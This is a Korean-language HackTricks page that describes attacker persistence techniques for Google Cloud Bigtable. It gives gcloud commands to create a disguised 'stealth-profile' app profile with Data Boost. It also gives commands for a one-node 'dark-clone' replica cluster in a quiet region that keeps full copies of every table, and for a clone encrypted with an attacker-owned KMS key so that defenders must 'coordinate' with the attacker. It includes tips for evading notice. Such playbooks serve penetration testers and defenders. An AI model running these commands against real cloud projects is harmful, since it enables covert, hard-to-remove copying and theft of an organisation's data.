# GCP - Bigtable 지속성

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

Bigtable에 대한 자세한 내용은 다음을 확인하세요:

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

### 공격자 전용 App Profile

**권한:** `bigtable.appProfiles.create`, `bigtable.appProfiles.update`.

트래픽을 replica cluster로 라우팅하는 app profile을 생성하고 Data Boost를 활성화하여 방어자가 알아차릴 수 있는 프로비저닝된 노드에 의존하지 않도록 하세요.

<details>

<summary>스텔스 app profile 생성</summary>
```bash
gcloud bigtable app-profiles create stealth-profile \
--instance=<instance-id> --route-any --restrict-to=<attacker-cluster> \
--row-affinity --description="internal batch"

gcloud bigtable app-profiles update stealth-profile \
--instance=<instance-id> --data-boost \
--data-boost-compute-billing-owner=HOST_PAYS
```
</details>

이 프로필이 존재하는 한, 이를 참조하는 새 자격증명으로 다시 연결할 수 있습니다.

### 자체 복제 클러스터 유지

**Permissions:** `bigtable.clusters.create`, `bigtable.instances.update`, `bigtable.clusters.list`.

조용한 리전에 최소 노드 수의 클러스터를 프로비저닝하세요. 클라이언트 식별자가 사라지더라도, **클러스터는 방어자가 명시적으로 제거할 때까지 모든 테이블의 전체 복사본을 유지합니다.**

<details>

<summary>복제 클러스터 생성</summary>
```bash
gcloud bigtable clusters create dark-clone \
--instance=<instance-id> --zone=us-west4-b --num-nodes=1
```
</details>

`gcloud bigtable clusters describe dark-clone --instance=<instance-id>`로 상태를 주시하면 데이터를 가져와야 할 때 즉시 스케일 업할 수 있습니다.

### 자체 CMEK 뒤에 복제 잠그기

**권한:** `bigtable.clusters.create`, `cloudkms.cryptoKeyVersions.useToEncrypt` on the attacker-owned key.

클론을 생성할 때 본인의 KMS 키를 사용하세요. 그 키가 없으면 Google은 클러스터를 재생성하거나 fail over할 수 없으므로 blue teams는 손대기 전에 반드시 당신과 조율해야 합니다.

<details>

<summary>CMEK로 보호된 클러스터 생성</summary>
```bash
gcloud bigtable clusters create cmek-clone \
--instance=<instance-id> --zone=us-east4-b --num-nodes=1 \
--kms-key=projects/<attacker-proj>/locations/<kms-location>/keyRings/<ring>/cryptoKeys/<key>
```
</details>

프로젝트에서 키를 교체하거나 비활성화하면 리플리카를 즉시 사용 불능으로 만들 수 있습니다(나중에 다시 켤 수는 있습니다).

{{#include ../../../banners/hacktricks-training.md}}
